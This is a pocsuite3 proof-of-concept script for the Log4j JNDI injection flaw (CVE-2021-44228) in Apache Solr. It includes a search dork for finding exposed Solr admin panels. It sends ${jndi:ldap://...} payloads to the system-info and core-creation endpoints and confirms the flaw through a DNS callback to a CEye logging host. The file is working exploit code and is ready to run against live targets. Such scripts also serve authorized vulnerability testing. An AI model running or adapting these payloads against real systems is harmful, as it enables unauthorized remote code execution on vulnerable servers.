#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Time    : 2021/12/18 10:53 PM
# @Author  : waffle
# @Email   : ox01024@163.com
# @File    : Apache_Solr_log4j2.py

import time
from collections import OrderedDict
from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
    get_listener_ip,
    get_listener_port,
    CEye,
)
from pocsuite3.lib.core.interpreter_option import (
    OptString,
    OptDict,
    OptIP,
    OptPort,
    OptBool,
    OptInteger,
    OptFloat,
    OptItems,
)
from pocsuite3.modules.listener import REVERSE_PAYLOAD


class DemoPOC(POCBase):
    vulID = "CVE-2021-44228"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "waffle"  # PoC作者的大名
    vulDate = "2021-12-9"  # 漏洞公开的时间,不知道就写今天
    createDate = "2021-12-18"  # 编写 PoC 的日期
    updateDate = "2021-12-18"  # PoC 更新的时间,默认和编写时间一样
    references = []  # 漏洞地址来源,0day不用写
    name = "ApcheSolr log4j组件RCE"  # PoC 名称
    appPowerLink = "https://logging.apache.org/log4j/2.x/"  # 漏洞厂商主页地址
    appName = "ApcheSolr"  # 漏洞应用名称
    appVersion = "未知"  # 漏洞影响版本
    vulType = VUL_TYPE.LDAP_INJECTION  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    drok='"solrAdminApp" + "Apache SOLR"'
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
            前台RCE
        """  # 漏洞简要描述
    pocDesc = """
            poc的用法描述
        """  # POC用法描述

    def _check(self):
        ce=CEye()
        flag = ce.build_request("Solr", type='dns')
        payloads={
            'path01': 'solr/admin/info/system?_=${jndi:ldap://'+flag['url']+'/x}&wt=json',
            'path02': r"/solr/admin/cores?action=CREATE&name=$%7Bjndi:ldap://"+flag['url']+"/a%7D&wt=json'",
        }
        for payload in payloads:
            _url=self.url+payloads[payload]
            try:
                r = requests.get(_url)
            except Exception:
                continue
            time.sleep(1)
            info = ce.exact_request(flag["flag"], type="dns")
            if info:
                return _url,flag['url']
        return False



    def _verify(self):
        result = {}
        p = self._check()
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
            result['VerifyInfo']['dnslog'] = p[1]
        # 的parse_output通用结果处理函数对_verify和_attack结果进行处理。
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            # 输出调用成功信息
            output.success(result)
        else:
            # 输出调用失败
            output.fail('target is not vulnerable')
        return output

# 注册 DemoPOC 类
register_poc(DemoPOC)
